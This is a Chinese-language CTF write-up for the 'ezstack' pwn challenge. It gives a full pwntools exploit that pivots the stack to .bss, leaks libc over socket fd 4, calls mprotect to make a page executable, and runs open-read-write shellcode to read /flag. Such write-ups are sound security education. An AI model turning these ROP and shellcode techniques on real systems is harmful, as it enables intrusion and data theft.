# ezstack

## 题目简述

程序存在栈溢出，但输入空间不足以一次放下完整利用链；同时沙箱禁止直接使用 `execve`。程序通过原始 TCP socket 与选手交互，连接对应的文件描述符为 4，而不是标准输出 1。解法通过多次 `leave; ret` 把栈迁移到 `.bss`，先从 GOT 泄露 libc，再调用 `mprotect` 把 `.bss` 攭为可执行，最后运行 open-read-write shellcode 读取 `/flag` 并写回 socket。

## 解题过程

### 1. 第一次迁移到 `.bss`

二进制中可用的固定地址为：

```text
leave ; ret           0x4013cb
pop rdi ; ret         0x401713
pop rsi ; pop r15 ; ret
                      0x401711
可写 .bss             0x404000 附近
```

`leave; ret` 等价于：

```asm
mov rsp, rbp
pop rbp
ret
```

只要覆盖保存的 `rbp` 为可写地址，并把保存的返回地址改为 `leave; ret`，便可令 `rsp` 转移到提前写入 `.bss` 的伪栈。原利用先在偏移 `0x50` 处放入新的 `rbp` 与重新进入易溢出函数的地址，为后续大块 ROP 数据准备稳定落点。

栈迁移的通用原理也可参考 PDF 中附带的 [Hello CTF ROP Tricks](https://hello-ctf.com/hc-pwn/ROP_Tricks/#_2)，但本题所需的具体迁移链已完整写在下文，无需依赖外链理解。

### 2. 从 socket 泄露 libc

服务没有使用常规 `stdin/stdout`，而是直接对已接受的 TCP socket 读写。题目环境中连接 fd 为 4，所以调用程序内部的输出函数时必须令 `rdi=4`。利用链把 `write@got` 地址 `0x404030` 作为缓冲区传入输出函数 `0x401376`，再回到易溢出函数 `0x40140f`：

```text
rdi = 4
rsi = write@got
call print/write wrapper
return vuln
```

收到 `write` 的真实地址后，用配套 `libc-2.31.so` 的符号偏移计算 libc 基址。

### 3. 调用 `mprotect` 并执行 ORW

第二条 `.bss` 伪栈调用：

```c
mprotect((void *)0x404000, 0x1000, 7);
```

权限 7 表示可读、可写、可执行。随后再次返回易溢出函数，把 `/flag` 字符串和 shellcode 写进这一页。

由于 `execve` 被沙箱过滤，shellcode 执行以下系统调用：

1. `open("/flag", O_RDONLY, 0)`；
2. `read(5, 0x404000, 0xf0)`；
3. `write(4, 0x404000, 0xf0)`。

这里假设监听 socket 占用 fd 3、已接受连接占用 fd 4，因此随后打开的 `/flag` 为 fd 5。若本地复现的 fd 分配不同，应在调试器中确认，或把 shellcode 改为直接使用 `open` 的返回值 `rax`。

### 4. 完整 exploit

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./vuln", checksec=False)
context.arch = "amd64"
libc = ELF("./libc-2.31.so", checksec=False)


def start():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process(elf.path)


io = start()

leave_ret = 0x4013CB
pop_rdi = 0x401713
pop_rsi_r15 = 0x401711
vuln = 0x40140F
print_wrapper = 0x401376

# 第一阶段：重新进入 vuln，并把后续输入迁移到 .bss。
payload = flat({
    0x50: [
        p64(0x404154),
        p64(vuln),
    ]
})
io.sendafter(b"Good luck.\n", payload)

# 第二阶段：在 .bss 上构造伪栈，向 fd 4 泄露 write@got。
payload = flat({
    0x00: p32(0),
    0x04: [
        p64(0x4041A0),
        p64(pop_rdi),
        p64(4),
        p64(pop_rsi_r15),
        p64(0x404030),
        p64(0),
        p64(print_wrapper),
        p64(vuln),
        p32(4),
        p32(4),
    ],
    0x50: [
        p64(0x404108),
        p64(leave_ret),
    ],
})
io.send(payload)

write_addr = u64(io.recvn(6).ljust(8, b"\0"))
libc.address = write_addr - libc.sym["write"]
log.success(f"write: {write_addr:#x}")
log.success(f"libc base: {libc.address:#x}")

pop_rsi = libc.address + 0x2601F
pop_rdx_r12 = libc.address + 0x119431
mprotect = libc.sym["mprotect"]

# 第三阶段：把 0x404000 所在页改为 RWX，再回到 vuln 接收 shellcode。
payload = flat({
    0x00: [
        p64(0x4041E0),
        p64(pop_rdi),
        p64(0x404000),
        p64(pop_rsi),
        p64(0x1000),
        p64(pop_rdx_r12),
        p64(7),
        p64(0),
        p64(mprotect),
        p64(vuln),
    ],
    0x50: [
        p64(0x404150),
        p64(leave_ret),
    ],
})
io.send(payload)

shellcode = asm("""
    mov rdi, 0x404190
    xor edx, edx
    xor esi, esi
    push 2
    pop rax
    syscall

    push 5
    pop rdi
    mov dx, 0xf0
    mov esi, 0x404000
    xor eax, eax
    syscall

    push 4
    pop rdi
    push 1
    pop rax
    syscall
""")

payload = b"/flag".ljust(8, b"\0")
payload += p64(0x4041B0) * 3
payload += shellcode
io.send(payload)
io.interactive()
```

运行远程模式时显式传入目标：

```bash
python3 solve.py REMOTE HOST=challenge.example PORT=12345
```

原 PDF 没有保存最终 flag，当前仓库也缺少二进制、Dockerfile 和 libc，因此这里不能声称已动态复现；硬编码地址仅对原附件有效。公开选手题解同样确认了“fd 4 泄露、`.bss` 栈迁移、受 seccomp 约束后 ORW”的链条，可作为静态交叉核对：[HGAME 2025 Week 1 Writeup](https://summ2.link/categories/CTF/hgame-2025-week1-wp/)。

## 方法总结

本题的三项关键约束分别对应三段利用：短栈空间用 `leave; ret` 迁移解决，ASLR 用 GOT 泄露解决，`execve` 沙箱用 ORW 解决。最容易忽略的是文件描述符：服务通过 socket 直接交互，输出必须写到 fd 4；`open` 返回的 fd 也应以实际进程状态为准。完整利用链应在配套 libc 与容器环境中重新核对所有 gadget、`.bss` 地址和 seccomp 规则。
